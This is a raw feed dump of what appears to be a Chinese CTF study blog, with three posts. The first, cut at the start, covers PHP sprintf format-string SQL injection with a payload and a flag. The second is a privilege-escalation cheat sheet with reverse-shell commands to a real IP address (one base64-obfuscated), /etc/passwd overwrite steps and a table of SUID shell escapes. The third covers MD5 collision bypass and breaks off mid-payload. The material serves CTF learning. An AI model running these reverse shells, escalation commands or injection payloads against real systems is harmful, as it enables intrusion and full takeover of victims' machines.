class="hljs-string">&quot;m&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-variable">$timestamp</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出当前日期，格式为 mm-dd-yyyy</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135759133.png" alt="image-20250331135759133"></p><h1 id="sprintf函数存在的漏洞"><a href="#sprintf函数存在的漏洞" class="headerlink" title="sprintf函数存在的漏洞"></a><code>sprintf</code>函数存在的漏洞</h1><h2 id="占位符漏洞"><a href="#占位符漏洞" class="headerlink" title="占位符漏洞"></a>占位符漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>格式化字符串函数在处理占位符时，会按照特定规则将传入的参数替换到占位符所在的位置，当用户能够控制格式化字符串（包含占位符）或部分参数时，就可能出现安全问题。</p><p>攻击者可以利用特殊构造的格式化字符串来读取内存中的敏感信息、修改内存数据、甚至执行任意代码。</p><h3 id="1"><a href="#1" class="headerlink" title="%1$"></a><code>%1$</code></h3><p><code>%1$</code>是格式化字符串中的一种高级占位符用法，在格式化字符串中，<code>%</code>通常是占位符的起始符号。<code>%1$</code> 中的 <code>1</code> 代表参数列表中的第 1 个参数（编号从 1 开始），<code>$</code> 是分隔符，它的作用是明确指定要使用的参数序号。借助这种方式，你能够精确控制在格式化字符串中使用哪个参数进行替换，还可以多次使用同一个参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2, arg++)<br></code></pre></td></tr></table></figure><p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p><p><strong>如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;a=%2\$s, b=%1\$s&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-comment">// 执行结果为：a=b, b=a</span><br></code></pre></td></tr></table></figure><p><code>%2\$s</code> 表示将第 2 个参数（即 <code>&quot;b&quot;</code> ）以字符串类型插入，<code>%1\$s</code> 表示将第 1 个参数（即 <code>&quot;a&quot;</code> ）以字符串类型插入。所以最终输出 <code>a=b, b=a</code> 。 其中 <code>\</code> 是转义字符，用来转义 <code>$</code> ，防止它被 shell 等环境提前解析 ，确保 <code>sprintf</code> 函数能正确识别占位符。 而 <code>%2$s</code> 里的 <code>2</code> 指明用第 2 个参数，<code>s</code> 表明参数类型为字符串。</p><h3 id="sprintf底层实现代码"><a href="#sprintf底层实现代码" class="headerlink" title="sprintf底层实现代码"></a><code>sprintf</code>底层实现代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">switch</span> (format[inpos]) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>    &#123;<br>        zend_string * t;<br>        zend_string * str = <span class="hljs-title function_ invoke__">zval_get_tmp_string</span>(tmp, &amp;t);<br>        <span class="hljs-title function_ invoke__">php_sprintf_appendstring</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">ZSTR_VAL</span>(str), width, precision, padding, alignment, <span class="hljs-title function_ invoke__">ZSTR_LEN</span>(str), <span class="hljs-number">0</span>, expprec, <span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">zend_tmp_string_release</span>(t);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenduint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;g&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenddouble</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_double</span>(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, (char) <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp));<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">3</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, HEXCHARS, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">1</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, <span class="hljs-string">&#x27;%&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过底层实现代码可以发现，<code>sprintf（）</code>方法就是对15种类型做了匹配，15种类型以外的就直接break了没有做任何处理，所以就会导致一个问题：</p><p>如果我们输入<code>%</code>\或者<code>%1$\</code>,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么<code>%\</code>,<code>%1$\</code>就因为没有经过任何处理而被替换为空。</p><p>因此<code>sprintf</code>注入的原理就是用一个15种类型之外的<code>\</code>来代替格式字符类型让函数替换为空，则<code>%1$\&#39;</code>后面的单引号就能闭合前面的单引号。</p><p>此外，还要注意**函数<code>addslashes()</code>**作用是返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜杠<code>\</code>、<code>NULL</code>。比如下面的代码，这样就造成了得结果是我们无法在注入的过程当中使用单引号（’）</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331182802265.png" alt="image-20250331182802265"></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目来源</p><blockquote><p>NSSCTF–git泄露</p></blockquote><p>这是这题的后半部分的考点，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码，这段代码通过<code>GET</code>请求的<code>name</code>和<code>pass</code>参数，构造一条<code>SQL</code>查询语句，从 <code>user</code> 表中筛选出符合特定条件的记录。</p><p><code>payload</code>如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>&amp;pass=123%1$&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+<br></code></pre></td></tr></table></figure><p><strong><code>addslashes()</code>将’转义成&#39; 则passpass&#x3D;123%1$&#39;</strong></p><p>最终构造的SQL语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> pass<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184548380.png" alt="image-20250331184548380"></p><p>可以看到跳转到<code>wjbh.php</code>这个页面了，虽然表面上看着是<code>Not Found</code>，但这实际是出题人写来混淆的，抓包可以知道状态码是200，查看源码可以看到<code>flag</code>的位置在<code>/flag</code></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184805384.png" alt="image-20250331184805384"></p><p>但是访问后却发现又回到最初的界面了</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184936727.png" alt="image-20250331184936727"></p><p>那就去抓包看看</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185243464.png" alt="image-20250331185243464"></p><p>发现<code>cookie</code>请求头中有一个参数<code>file</code>，对其值进行 Hex 解码</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185501796.png" alt="image-20250331185501796"></p><p>解出<code>flag.txt</code>，访问又是什么都没有，再继续抓包</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185545261.png" alt="image-20250331185545261"></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185805000.png" alt="image-20250331185805000"></p><p>没什么区别，看到之前的<code>cookie</code>参数<code>file</code>，想到是不是用来读取<code>flag.txt</code>这个文件的，但是没有读到，要是给它加上伪协议读取呢</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190020446.png" alt="image-20250331190020446"></p><p>还是不行</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190440729.png" alt="image-20250331190440729"></p><p>想到之前的提示在<code>/flag</code>文件中，那就读取这个文件</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190532826.png" alt="image-20250331190532826"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>f666c6167<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190609726.png" alt="image-20250331190609726"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">31</span>ba3d58-<span class="hljs-number">60</span>d3-<span class="hljs-number">40</span>f8-<span class="hljs-number">9</span>e39-<span class="hljs-number">291</span>c554cdf46&#125;<br></code></pre></td></tr></table></figure><p>这就出flag了，好难的萌新赛</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权</title>
    <link href="/2025/04/25/%E6%8F%90%E6%9D%83/"/>
    <url>/2025/04/25/%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="用VPS反弹shell"><a href="#用VPS反弹shell" class="headerlink" title="用VPS反弹shell"></a>用VPS反弹shell</h2><p><strong>攻击机监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><strong>目标机</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>127.0.0.1 | <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>nc -e /bin/sh 47.122.75.126 2333<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="已知一个用户的密码"><a href="#已知一个用户的密码" class="headerlink" title="已知一个用户的密码"></a><strong>已知一个用户的密码</strong></h3><ul><li>用<code>cat /etc/passwd</code>命令来查看用户</li><li>用<code>su 用户名</code>命令来切换用户，尝试出已知的密码是哪一个用户的</li><li>用<code>sudo -l</code>命令来查看当前用户的权限</li></ul><h3 id="tar包提权"><a href="#tar包提权" class="headerlink" title="tar包提权"></a><strong>tar包提权</strong></h3><p>如果管理员给予了某个普通用户tar命令的超级管理员操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;<br></code></pre></td></tr></table></figure><ul><li><code>-c</code>：创建新的档案文件，相当于打包（-x，相反的操作，拆包）</li><li><code>-f</code>：使用档名，f之后直接加档名，中间不能加其他参数</li><li><code>--checkpoint=n</code>：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由 –checkpoint-action 指定</li><li><code>exec</code>：执行外部命令</li></ul><p>执行这个命令后就提权成功了，用<code>id</code>命令查看当前用户发现已经是root，此时可以自由查看 &#x2F;root 文件中的内容</p><h3 id="suid-cp提权"><a href="#suid-cp提权" class="headerlink" title="suid cp提权"></a><strong>suid cp提权</strong></h3><p>用命令查找是否存在suid提权的可能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>看到<code>/bin/cp</code>就知道可以用 cp 提权了<br>操作步骤：先构造一个和&#x2F;etc&#x2F;passwd里一样的文件 然后在文件的末尾加上一个用户 这个用户的相关信息都可以随你编写 再利用cp的高权限对&#x2F;etc&#x2F;passwd文件进行覆盖 </p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h4><p>在&#x2F;tmp新建一个passwd文件，在tmp的原因是因为tmp目录是临时缓存目录 一般访问和修改权限较低但可执行权限较高</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo &quot;hacker::0:0:hacker:/home/hacker:/bin/bash&quot; &gt;&gt;/tmp/passwd<br></code></pre></td></tr></table></figure><p>然后回到命令行使用 cp 命令把 &#x2F;etc&#x2F;passwd 用 &#x2F;tmp&#x2F;passwd 替换掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /tmp/passwd /etc/passwd<br></code></pre></td></tr></table></figure><p>然后<code>cat /etc/passwd</code>查看 &#x2F;etc&#x2F;passwd 可以看到有了hacker用户</p><p>使用<code>su hacker</code>命令切换成hacker用户</p><p>此时我们拥有root权限，就可以查看root文件里的内容了</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /bin/bash /tmp<br>/bin/cp --attributes-only --preserve=all /bin/cp /tmp/bash<br>/tmp/bash -p<br></code></pre></td></tr></table></figure><p>依次执行完这三个命令</p><p>用<code>id</code>命令可以看到euid已经是root了，用<code>whoami</code>可以看到是root</p><p>此时就可以查看root文件里的内容</p><h3 id="suid-gdb提权"><a href="#suid-gdb提权" class="headerlink" title="suid gdb提权"></a>suid gdb提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit<br></code></pre></td></tr></table></figure><h3 id="常用提权命令"><a href="#常用提权命令" class="headerlink" title="常用提权命令"></a>常用提权命令</h3><table><thead><tr><th><strong><font style="color:rgb(0, 161, 251);">命令</font></strong></th><th><strong><font style="color:rgb(0, 161, 251);">利用方法</font></strong></th></tr></thead><tbody><tr><td>zsh</td><td>zsh</td></tr><tr><td><strong>xargs</strong></td><td>xargs -a &#x2F;dev&#x2F;null sh -p</td></tr><tr><td><strong>watch</strong></td><td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td></tr><tr><td><strong>timeout</strong></td><td>timeout 7d &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>time</strong></td><td>time &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>tclsh</strong></td><td>+ tclsh <br/>+ exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout 2&gt;@stderr</td></tr><tr><td><strong>taskset</strong></td><td>taskset 1 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>stdbuf</strong></td><td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>strace</strong></td><td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ssh</strong></td><td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td></tr><tr><td><strong>setarch</strong></td><td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>rsync</strong></td><td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td></tr><tr><td><strong>rpm</strong></td><td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td></tr><tr><td><strong>python</strong></td><td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td><strong>php</strong></td><td>+  CMD&#x3D;”&#x2F;bin&#x2F;sh”  <br/>+  php -r “pcntl_exec(’&#x2F;bin&#x2F;sh’, [’-p’]);”</td></tr><tr><td><strong>nice</strong></td><td>nice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>nano</strong></td><td>+  nano &#x2F;&#x2F;运行nano程序  <br/>+  ^R &#x2F;&#x2F;按下ctrl-r  <br/>+  ^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td></tr><tr><td><strong>more</strong></td><td>+  more &#x2F;etc&#x2F;profile<br/>+  !&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>logsave</strong></td><td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td></tr><tr><td><strong>less</strong></td><td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ksh</strong></td><td>ksh -p</td></tr><tr><td><strong>ip</strong></td><td>+  ip netns add foo  <br/>+  ip netns exec foo &#x2F;bin&#x2F;sh -p  <br/>+  ip netns delete foo</td></tr><tr><td><strong>ionice</strong></td><td>ionice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>git</strong></td><td>git help status</td></tr><tr><td><strong>gimp</strong></td><td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td><strong>gdb</strong></td><td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td></tr><tr><td><strong>ftp</strong></td><td>ftp &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>flock</strong></td><td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>find</strong></td><td>find . -exec &#x2F;bin&#x2F;sh -p ; -quit</td></tr><tr><td><strong>expect</strong></td><td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td></tr><tr><td><strong>env</strong></td><td>env &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ed</strong></td><td>ed &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>docker</strong></td><td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td></tr><tr><td><strong>dmesg</strong></td><td>dmesg -H&#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td><strong>csh</strong></td><td>csh -b</td></tr><tr><td><strong>bash</strong></td><td>bash -p</td></tr><tr><td><strong>awk</strong></td><td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td></tr><tr><td><strong>perl</strong></td><td>perl exec “&#x2F;bin&#x2F;bash”;</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD5绕过</title>
    <link href="/2025/04/25/MD5%E7%BB%95%E8%BF%87/"/>
    <url>/2025/04/25/MD5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">对于：(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>])<br>● md5_1=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span 